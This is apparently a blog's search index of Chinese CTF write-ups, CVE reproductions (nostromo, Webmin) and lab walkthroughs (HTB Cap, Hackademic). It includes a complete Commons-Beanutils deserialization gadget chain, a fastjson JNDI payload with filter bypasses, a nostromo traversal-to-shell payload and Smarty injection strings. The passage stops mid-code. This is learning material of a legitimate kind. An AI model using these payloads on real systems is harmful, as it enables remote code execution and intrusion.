<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>[CISCN2019_华东南赛区]Web11</title>
    <url>/posts/5617cb6f/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>Smarty SSTI</p>
<p>{if}标签，其需要{&#x2F;if}来进行配对，当然也可以使用{else}和{elseif}。全部条件表达式和函数都可以在if使用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><p><img src="/posts/5617cb6f/image-20250821141356579.png" alt="image-20250821141356579"></p>
<p>找到注入点之后使用if标签来读取flag</p>
<h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p><img src="/posts/5617cb6f/image-20250821141547324.png" alt="image-20250821141547324"></p>
<p>直接进行命令执行。</p>
]]></content>
      <categories>
        <category>复现</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2019-16278</title>
    <url>/posts/fbb66933/</url>
    <content><![CDATA[<h2 id="nostromo-远程命令执行-（CVE-2019-16278）"><a href="#nostromo-远程命令执行-（CVE-2019-16278）" class="headerlink" title="nostromo 远程命令执行 （CVE-2019-16278）"></a>nostromo 远程命令执行 （CVE-2019-16278）</h2><h4 id="nostromo"><a href="#nostromo" class="headerlink" title="nostromo"></a>nostromo</h4><p>一款开源的web服务器</p>
<h4 id="做题方法"><a href="#做题方法" class="headerlink" title="做题方法"></a>做题方法</h4><p>nostromo1.9.6 存在目录穿越命令，攻击者指向&#x2F;bin&#x2F;sh这样的shell文件后，借此执行任意命令</p>
<p>路径遍历使用的是.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;.%0d.&#x2F;bin&#x2F;sh ,后端会将换行删除最后呈现的是..&#x2F;..&#x2F;..&#x2F;..&#x2F;bin&#x2F;sh</p>
<p><img src="/posts/fbb66933/image-20250627214650362.png" alt="image-20250627214650362"></p>
<p>可以执行命令，然后我们就可以使用工具</p>
<p>如果你去执行命令的话，波煮试过了执行id命令，不会执行，会报错，具体原因，波煮看完别人的文章也复现不出来（波煮很菜）然后只能用工具得到进行命令执行了。</p>
<p><a href="https://github.com/jas502n/CVE-2019-16278">https://github.com/jas502n/CVE-2019-16278</a></p>
<p><img src="/posts/fbb66933/image-20250627214734490.png" alt="image-20250627214734490"></p>
<p><img src="/posts/fbb66933/image-20250627214747646.png" alt="image-20250627214747646"></p>
]]></content>
      <categories>
        <category>src</category>
        <category>漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>CB链</title>
    <url>/posts/38eae94f/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>参考：<a href="https://www.cnblogs.com/1vxyz/p/17588722.html">https://www.cnblogs.com/1vxyz/p/17588722.html</a></p>
<p>依赖</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.8.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-logging&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p>学习的时候没看到添加cc3.1依赖的但是一直报这个java.lang.NoClassDefFoundError: org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;comparators&#x2F;ComparableComparator错误，但是这个ComparableComparator包又在cc中，只能添加了（实则是没法了）。</p>
<p>jdk用的1.8u65</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="主要利用点"><a href="#主要利用点" class="headerlink" title="主要利用点"></a>主要利用点</h3><p>CB链中有一个很特殊的类里的方法，就是PropertyUtils.getProperty()，举个例子应该就很明白了，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class person&#123;</span><br><span class="line">private String name;</span><br><span class="line">private int age;</span><br><span class="line">public String getName()&#123;return this.name;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//测试</span><br><span class="line">Person person = new Person(&quot;LL&quot;);</span><br><span class="line">PropertyUtils.getProperty(person,&quot;name&quot;);</span><br><span class="line">//其实它就等价于</span><br><span class="line">Person person = new Person(&quot;LL&quot;);</span><br><span class="line">person.getName();</span><br></pre></td></tr></table></figure>

<p>正因为有了这个类，我们也就有了主要的利用点</p>
<h3 id="分析与结果"><a href="#分析与结果" class="headerlink" title="分析与结果"></a>分析与结果</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line"></span><br><span class="line">      byte[] b = Files.readAllBytes(Paths.get(&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;));</span><br><span class="line">      byte[][] b1 = &#123;b&#125;;</span><br><span class="line"></span><br><span class="line">      Class aClass = templates.getClass();</span><br><span class="line">      Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">      bytecodes.setAccessible(true);</span><br><span class="line">      bytecodes.set(templates, b1);</span><br><span class="line"></span><br><span class="line">      Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">      name.setAccessible(true);</span><br><span class="line">      name.set(templates,&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">      Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">      tfactory.setAccessible(true);</span><br><span class="line">      tfactory.set(templates,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure>

<p>这是前半段和cc3一样，就不过多赘述了，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineTransletClasses()-&gt;newTransformer()-&gt;getOutputProperties()</span><br></pre></td></tr></table></figure>

<p>而getOutputProperties()正是我们想要的，我们可以使用上述的利用点来对TemplatesImpl的getOutputProperties()方法进行调用这样就来到了PropertyUtils.getProperty()这里</p>
<p><img src="/posts/38eae94f/1765450544904-bafe342f-5dfa-4501-bdf8-d51068ddc494.png" alt="img"></p>
<p>我们会发现这里调用了PropertyUtils.getProperty()，然后还是我们熟悉的compare，那就很舒服了</p>
<p>然后剩下一部分可以模仿cc2来写，但是要改掉一部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BeanComparator beanComparator = new BeanComparator();</span><br></pre></td></tr></table></figure>

<p><img src="/posts/38eae94f/1765451074879-109b392e-31e6-4a0b-950d-126c3ba3b410.png" alt="img"></p>
<p>不能直接传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);</span><br></pre></td></tr></table></figure>

<p>否则会在add的时候提前进入，这里要在后面用反射修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue priorityQueue = new PriorityQueue(beanComparator); </span><br><span class="line"></span><br><span class="line">       priorityQueue.add(1);</span><br><span class="line">       priorityQueue.add(2);</span><br></pre></td></tr></table></figure>

<p>这里一定要add两个，让size为2，否则进不去</p>
<p><img src="/posts/38eae94f/1765451232373-0222d599-f7d5-4b68-8a53-057f56db91db.png" alt="img"></p>
<p>这里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue priorityQueue = new PriorityQueue(beanComparator); //可以直接传</span><br></pre></td></tr></table></figure>

<p>能够直接传的原因也很简单</p>
<p>由于add1和2，所以看下图</p>
<p><img src="/posts/38eae94f/1765451957337-2f8c0bcf-7aa7-4b68-b574-f5eefc3c4314.png" alt="img"></p>
<p>o1是o2是1，这样是无法直接进行调用的然后继续分析</p>
<p>beanComparator（反射修改）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class aClass1 = beanComparator.getClass();</span><br><span class="line">        Field property = aClass1.getDeclaredField(&quot;property&quot;);</span><br><span class="line">        property.setAccessible(true);</span><br><span class="line">        property.set(beanComparator,&quot;outputProperties&quot;);</span><br></pre></td></tr></table></figure>



<p>然后还有一个点调了好长时间就是那个o1和o2</p>
<p><img src="/posts/38eae94f/1765452059301-a3ad909d-ed19-45cf-93cd-6fbf0891524b.png" alt="img"></p>
<p>注意这个queue<a href="%E4%BB%96%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%ACadd%E8%BF%9B%E5%8E%BB%E7%9A%841">0</a></p>
<p><img src="/posts/38eae94f/1765452088657-7831ed51-ac72-4115-a2d6-c3c3a6a31ead.png" alt="img"></p>
<p>注意x</p>
<p><img src="/posts/38eae94f/1765452181526-617f09d4-1598-4f97-80e4-44e4fa187430.png" alt="img"></p>
<p>queue[1]&#x3D;2</p>
<p>最后传入了1，2所以我们最后要用反射改这里（改成templates）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class aClass2 = priorityQueue.getClass();</span><br><span class="line">//        Field priority = aClass2.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">//        priority.setAccessible(true);</span><br><span class="line">//        priority.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        Field queueField = aClass2.getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        queueField.setAccessible(true);</span><br><span class="line">        Object[] queueArray = (Object[]) queueField.get(priorityQueue);</span><br><span class="line"></span><br><span class="line">        queueArray[0] = templates;</span><br><span class="line">        queueArray[1] = templates;</span><br></pre></td></tr></table></figure>

<p>这样就修改成功了</p>
<p>整体就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.beanutils.BeanComparator;</span><br><span class="line">import org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line">import javax.xml.ws.spi.Invoker;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class CB &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line"></span><br><span class="line">        byte[] b = Files.readAllBytes(Paths.get(&quot;D:\\Desktop\\java\\javacc\\target\\classes\\shell.class&quot;));</span><br><span class="line">        byte[][] b1 = &#123;b&#125;;</span><br><span class="line"></span><br><span class="line">        Class aClass = templates.getClass();</span><br><span class="line">        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodes.setAccessible(true);</span><br><span class="line">        bytecodes.set(templates, b1);</span><br><span class="line"></span><br><span class="line">        Field name = aClass.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        name.setAccessible(true);</span><br><span class="line">        name.set(templates,&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        Field tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        tfactory.setAccessible(true);</span><br><span class="line">        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">//        templates.getOutputProperties();</span><br><span class="line"></span><br><span class="line">//        PropertyUtils propertyUtils = new PropertyUtils();</span><br><span class="line">//        propertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br><span class="line"></span><br><span class="line">        BeanComparator beanComparator = new BeanComparator();</span><br><span class="line"></span><br><span class="line">//        beanComparator.compare(templates,templates);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line"></span><br><span class="line">        Class aClass1 = beanComparator.getClass();</span><br><span class="line">        Field property = aClass1.getDeclaredField(&quot;property&quot;);</span><br><span class="line">        property.setAccessible(true);</span><br><span class="line">        property.set(beanComparator,&quot;outputProperties&quot;);</span><br><span class="line"></span><br><span class="line">        Class aClass2 = priorityQueue.getClass();</span><br><span class="line">//        Field priority = aClass2.getDeclaredField(&quot;comparator&quot;);</span><br><span class="line">//        priority.setAccessible(true);</span><br><span class="line">//        priority.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        Field queueField = aClass2.getDeclaredField(&quot;queue&quot;);</span><br><span class="line">        queueField.setAccessible(true);</span><br><span class="line">        Object[] queueArray = (Object[]) queueField.get(priorityQueue);</span><br><span class="line"></span><br><span class="line">        queueArray[0] = templates;</span><br><span class="line">        queueArray[1] = templates;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void  serialize(Object o) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        return objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>cc链</category>
      </categories>
  </entry>
  <entry>
    <title>Cap</title>
    <url>/posts/a17ec151/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>HTB的第一台靶机<br>vpn选新加坡</p>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p><img src="/posts/a17ec151/20251222190734546.png" alt="image.png"><br>先进行扫描，发现有21，22，80端口<br>在去看一下web站点<br><img src="/posts/a17ec151/20251222191611893.png" alt="image.png"><br>这边有一个下载按钮，我们尝试下载之后有一个流量包，但是这个流量包中，没啥可利用的信息，这时候，我们注意到url中的1，尝试修改为0，继续下载试试呢。</p>
<p><img src="/posts/a17ec151/20251222191839078.png" alt="image.png"><br>发现可以利用的信息</p>
<p><img src="/posts/a17ec151/20251222192253186.png" alt="image.png"><br>这里就能很明了的看到ftp连接账户和密码了，这时我们尝试连接ftp<br>user：nathan<br>pass: Buck3tH4TF0RM3!<br>可以进行ftp连接，那么也可以试一下ssh喽</p>
<p><img src="/posts/a17ec151/20251222193543543.png" alt="image.png"><br>拿到第一个flag</p>
<p>接着下一个一般是在root目录里，这里需要提权，我们扫描一下看看，有哪些提权的地方<br>这里传linpeas的时候卡死了，解决办法就是可以尝试挂一个代理，然后在连接vpn，我只能说proxychain4还是太舒服了。</p>
<p><img src="/posts/a17ec151/20251222202302517.png" alt="image.png"><br>有python3.8，尝试python的一个uid提权，<a href="https://gtfobins.github.io/">GTFOBins</a></p>
<p><img src="/posts/a17ec151/20251222202524077.png" alt="image.png"><br>但是我们这里不能使用sudo，可以把它写到文件中执行，在给可执行权限</p>
<p><img src="/posts/a17ec151/20251222202855327.png" alt="image.png"><br>然后我们找到flag<br><img src="/posts/a17ec151/20251222202935157.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>src</category>
        <category>打靶</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2022-0824</title>
    <url>/posts/1d4bd7ca/</url>
    <content><![CDATA[<h2 id="webmin远程代码执行"><a href="#webmin远程代码执行" class="headerlink" title="webmin远程代码执行"></a>webmin远程代码执行</h2><p>webmin是功能最强大的基于web的unix系统管理工具</p>
<p>漏洞影响版本： &lt;1.990</p>
<p><img src="/posts/1d4bd7ca/1750256165530-4d4d3398-5756-4862-b6e9-3f4eba2fa872.png" alt="img"></p>
<p>poc: <a href="https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell">https://github.com/faisalfs10x/Webmin-CVE-2022-0824-revshell</a></p>
<p><img src="/posts/1d4bd7ca/1750256627286-ace1ab3b-9e48-4afe-84f7-4d3dd111cec2.png" alt="img"></p>
<p>弹到shell</p>
<p><img src="/posts/1d4bd7ca/1750256666299-62e52629-8712-4c6f-a361-f3be549d1111.png" alt="img"></p>
<p>这里要用python开一个web协议</p>
]]></content>
      <categories>
        <category>src</category>
        <category>漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>Ez_gadget</title>
    <url>/posts/9d9cb0c9/</url>
    <content><![CDATA[<h1 id="Ez-gadget"><a href="#Ez-gadget" class="headerlink" title="Ez_gadget"></a>Ez_gadget</h1><p>先对源码进行简单的审计<br><img src="/posts/9d9cb0c9/20260204115550766.png" alt="image.png"><br>第一个绕过点是上图位置，需要一个str，它的hashcode和key的要相同，但是字符不能相同，具体的构造可以看这篇文章<br><a href="https://blog.csdn.net/weixin_44245828/article/details/109853439">Java 构建 HashCode 相同的字符串_java 中hash相同的字符-CSDN博客</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&quot;#&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(parse.quote(<span class="built_in">chr</span>(<span class="built_in">ord</span>(key[<span class="number">0</span>])-<span class="number">1</span>)+<span class="built_in">chr</span>(<span class="built_in">ord</span>(key[<span class="number">1</span>])+<span class="number">31</span>)+key[<span class="number">2</span>::]))</span><br></pre></td></tr></table></figure>
<p>1.2.62的版本在加上给了xbean-reflect的依赖包<br><img src="/posts/9d9cb0c9/20260204122056388.png" alt="image.png"><br>exp为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;    </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;    </span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;    </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);    </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;rmi://localhost:1099/RO\&quot;&#125;&quot;</span>;    </span><br><span class="line">        JSON.parseObject(json);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种形式，但是这里要绕过一下，rmi,ldap,jndi,\x都不被允许。<br>首先是jndi我们可以使用unicode编码进行绕过（平常也可以使用16进制，但是这里将\x禁用了），然后对于远程资源加载的compile匹配，我们可以使用%0a进行绕过。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;\<span class="string">&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.\u004a\u006e\u0064\u0069Converter\&quot;,\&quot;AsText\&quot;:\&quot;%0armi://localhost:1099/RO\&quot;&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="/posts/9d9cb0c9/20260204124344815.png" alt="image.png"><br>成功rce</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>题目</category>
      </categories>
  </entry>
  <entry>
    <title>Hackademic.RTB1靶场复现</title>
    <url>/posts/7fe1cd90/</url>
    <content><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>靶场地址，直接下来搭建就行</p>
<p><a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">https://www.vulnhub.com/entry/hackademic-rtb1,17/</a></p>
<p>然后用kali进行攻击</p>
<p><img src="/posts/7fe1cd90/1759483482204-2e32c93f-9128-4d5d-a5d8-108f2d6ad27b.png" alt="img"></p>
<p>这边可以选择NAT，打开就行，不许要知道账号密码</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>扫描到这个靶场</p>
<p><img src="/posts/7fe1cd90/1759484200988-23cbec78-8502-4204-be9d-32f78f873b7b.png" alt="img"></p>
<p>信息收集找到</p>
<p><img src="/posts/7fe1cd90/1759484301641-efba7b33-cad7-4cc6-99f1-2af2edfffd2f.png" alt="img"></p>
<p>wordpress我们可以搜索一下有什么漏洞</p>
<p><img src="/posts/7fe1cd90/1759484360150-f93964a4-e12e-4f32-9b84-4f865aae811d.png" alt="img"></p>
<p>这边有sql注入，我们可以测试一下</p>
<p><img src="/posts/7fe1cd90/1759484530976-abfec2f1-48e8-414f-a3ff-2e924ee0e7ad.png" alt="img"></p>
<p>存在注入点，我们使用sqlmao去跑</p>
<p><img src="/posts/7fe1cd90/1759487839275-b9943eea-a6e8-4b6c-992f-d6184c563bc8.png" alt="img"></p>
<p><img src="/posts/7fe1cd90/1759487823621-22a1e039-25f1-4670-b3b5-9ffc6374b0c0.png" alt="img"></p>
<p>账户和密码</p>
<p><img src="/posts/7fe1cd90/1759487986717-0b35f19a-488d-484e-a453-364bb3d9e66c.png" alt="img"></p>
<p>扫一下目录</p>
<p>然后我们一个一个试一下</p>
<p>会发现admin是GeorgeMiller q1w2e3</p>
<p><img src="/posts/7fe1cd90/1759490962936-75241f75-13e9-4349-9def-88e61cbf3393.png" alt="img"></p>
<p>然后我们可以更改上传文件后缀名，然后点更新，有一个上传口（注意左上角要点）</p>
<p><img src="/posts/7fe1cd90/1759488409495-4bfa3533-be33-4104-8f65-cd287a472930.png" alt="img"></p>
<p>写个反弹shell的php文件，上传getshell</p>
<p><img src="/posts/7fe1cd90/1759488508915-3678078b-7787-478d-84e9-bbce3a9d67ce.png" alt="img"></p>
<p>这里传的是shell1.php文件哈</p>
<p><img src="/posts/7fe1cd90/1759488575791-2e433af4-ceee-4f21-a630-4eea7eea5dbf.png" alt="img"><img src="/posts/7fe1cd90/1759489334653-eb330d4b-fedc-4e5c-9587-d35c7f4ea40f.png" alt="img"></p>
<p><img src="/posts/7fe1cd90/1759488705322-a5ffea37-6266-4697-bc2d-d6cf52405297.png" alt="img"></p>
<p>信息收集发现权限低，在去找找漏洞看看有没有内核提权</p>
<p><img src="/posts/7fe1cd90/1759489306323-c65ca466-70a4-4772-88e2-f1b7d767e55b.png" alt="img"></p>
<p><img src="/posts/7fe1cd90/1759489444888-138c971a-7e0a-464b-a226-0273c7a871c3.png" alt="img"></p>
<p>下载到本地，开一个web服务</p>
<p><img src="/posts/7fe1cd90/1759489508279-0022cf0e-d0d9-4600-9570-44e8402dc55f.png" alt="img"></p>
<p><img src="/posts/7fe1cd90/1759489585088-3f5f7a6f-c34f-40a7-8ae2-a4b7ef3d0393.png" alt="img"></p>
<p>访问下载过来</p>
<p><img src="/posts/7fe1cd90/1759489645429-88d91317-af85-4b94-adcd-d839ccece736.png" alt="img"></p>
<p>编译成可执行文件</p>
<p><img src="/posts/7fe1cd90/1759491094481-4903de4f-480d-4de1-9bff-3046a7b22dbc.png" alt="img"></p>
<p>执行</p>
<p><img src="/posts/7fe1cd90/1759491171065-f68b1dc0-04df-4e99-aff3-9dfe47063c12.png" alt="img"></p>
<p>提权成功</p>
<p><img src="/posts/7fe1cd90/1759491253454-11ce3713-8ac8-4758-b20c-e8faabdc7a9f.png" alt="img"></p>
]]></content>
      <categories>
        <category>src</category>
        <category>打靶</category>
      </categories>
  </entry>
  <entry>
    <title>HNCTFWP</title>
    <url>/posts/6e605e05/</url>
    <content><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Really-Ez-Rce"><a href="#Really-Ez-Rce" class="headerlink" title="Really_Ez_Rce"></a>Really_Ez_Rce</h2><p><img src="/posts/6e605e05/1749459999013-4301ebc1-a056-4256-a8fb-cc03e6f590f3.png" alt="img"></p>
<p>第一步用数组就能直接绕过，第二步经过测试可以用$5进行隔断执行命令，</p>
<p><img src="/posts/6e605e05/1749460099287-38aab2aa-428c-4b3c-91b8-b3b338188886.png" alt="img"></p>
<p>拿到flag</p>
<h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Go Go Go~ 出发喽！&quot;</span> . <span class="variable language_">$this</span>-&gt;dengchao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Bagongren</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;Dagongren != <span class="variable language_">$this</span>-&gt;Bagongren) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Dagongren) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;Bagongren)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Dagongren)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;Bagongren)) )&#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;dao, [<span class="string">&#x27;诗人我吃！&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeiCaFei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HongCaFei</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;HongCaFei, [<span class="number">0</span> =&gt; <span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;What do you want to do?&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一步，需要绕过的点是throw new Exception(‘What do you want to do?’);  可以看文章</p>
<p><a href="https://xz.aliyun.com/news/11289">https://xz.aliyun.com/news/11289</a></p>
<p>然后就能进行反序列化了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GOGOGO</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dengchao</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DouBao</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Dagongren</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 